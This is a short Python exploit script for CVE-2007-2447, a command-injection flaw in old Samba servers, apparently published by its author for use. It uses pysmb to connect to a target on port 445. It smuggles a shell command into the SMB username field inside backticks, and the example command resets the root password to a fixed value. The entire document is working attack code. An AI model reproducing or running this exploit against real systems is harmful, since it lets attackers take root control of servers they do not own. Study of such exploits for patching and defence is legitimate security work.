#!/usr/bin/python
# Title: Exploit CVE-2007-2447
# Author: Brian Fair <blfair@gmail.com>, https://github.com/b1fair
# Notes: Use python 2.0, requires pysmb ("pip install pysmb")

from smb.SMBConnection import SMBConnection
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
target="127.0.0.1" # Host to target.
cmd="echo -e \"yourein\nyourein\" |passwd root" # Command to run, example changes root password to "yourein"

conn = SMBConnection("/=`nohup " + cmd + "`","doesntmatter","client",target)
conn.connect(target, 445)
